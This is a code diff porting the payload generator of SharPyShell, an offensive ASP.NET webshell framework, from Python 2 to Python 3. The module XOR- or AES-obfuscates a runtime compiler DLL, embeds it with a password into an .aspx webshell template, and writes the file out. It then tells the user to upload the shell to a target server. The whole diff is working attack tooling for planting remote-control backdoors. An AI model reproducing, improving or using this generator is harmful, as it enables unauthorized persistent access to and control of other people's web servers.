@@ -1,8 +1,10 @@
 from core import config
 from struct import unpack
+from itertools import cycle
 import hashlib
 import random
-
+import io
+import os
 
 class Generate():
 
@@ -11,11 +13,12 @@ class Generate():
     __obfuscator = ''
     __endian_type = ''
 
-    __templates_path = config.sharpyshell_path+'agent/'
-    __runtime_compiler_path = __templates_path + 'runtime_compiler/'
+    __templates_path = config.sharpyshell_path+'agent'+os.sep
+    __runtime_compiler_path = __templates_path + 'runtime_compiler'+os.sep
     __output_path = config.output_path + 'sharpyshell.aspx'
 
     def __init__(self, password, encryption, obfuscator, endian_type, output):
+        password = password.encode('utf-8')
         if encryption == 'aes128':
             self.__password = hashlib.md5(password).hexdigest()
         else:
@@ -41,15 +44,12 @@ class Generate():
 
     def __generate_webshell_code_encrypted_dll(self, template_code):
         def xor_file(path, key):
-            with open(path, 'rb') as file_handle:
+            with io.open(path, mode='rb') as file_handle:
                 plain_data = file_handle.read()
-            from itertools import izip, cycle
-            xored = ''.join(chr(ord(x) ^ ord(y)) for (x, y) in izip(plain_data, cycle(key)))
-            return bytearray(xored)
-
-        def generate_byte_file_string(byte_arr):
-            output = [str(hex(byte)) for byte in byte_arr]
-            return '{' + ",".join(output) + '}'
+            xored = []        
+            for (x, y) in list(zip(plain_data, cycle(key))):
+                xored.append(hex(x ^ ord(y)))
+            return '{' + ",".join(xored) + '}'
 
         if 'aes' in self.__encryption:
             dll_name = 'runtime_compiler_aes.dll'
@@ -57,14 +57,13 @@ class Generate():
             dll_name = 'runtime_compiler_xor.dll'
         runtime_compiler_dll_path = self.__runtime_compiler_path + dll_name
         obfuscated_dll = xor_file(runtime_compiler_dll_path, self.__password)
-        obfuscated_dll_string = generate_byte_file_string(obfuscated_dll)
         webshell_code = template_code.replace('{{SharPyShell_Placeholder_pwd}}', self.__password)
-        webshell_code = webshell_code.replace('{{SharPyShell_Placeholder_enc_dll}}', obfuscated_dll_string)
+        webshell_code = webshell_code.replace('{{SharPyShell_Placeholder_enc_dll}}', obfuscated_dll)
         return webshell_code
 
     def __generate_webshell_code_ulong_compression(self, template_code):
         def get_dll_code(dll_code_path):
-            with open(dll_code_path, 'r') as file_handle:
+            with open(dll_code_path, 'rb') as file_handle:
                 dll_code = file_handle.read()
             return dll_code
 
@@ -79,7 +78,7 @@ class Generate():
                 representation = '='
             for i in range(0, len(dll_code), 8):
                 int_conversion = unpack(representation + 'Q', dll_code[i:i + 8])[0]
-                ulong_quotients.append(str(int_conversion / divisor))
+                ulong_quotients.append(str(int_conversion // divisor))
                 ulong_remainders.append(str(int_conversion % divisor))
             ulong_quotients_string = '{' + ','.join(ulong_quotients) + '}'
             ulong_remainders_string = '{' + ','.join(ulong_remainders) + '}'
@@ -109,5 +108,5 @@ class Generate():
         webshell_output_path = self.__output_path
         with open(webshell_output_path, 'w') as file_handle:
             file_handle.write(webshell_code)
-        print 'SharPyShell webshell written correctly to: ' + webshell_output_path
-        print '\nUpload it to the target server and let\'s start having some fun :) \n\n'
+        print ('SharPyShell webshell written correctly to: ' + webshell_output_path)
+        print ('\nUpload it to the target server and let\'s start having some fun :) \n\n')
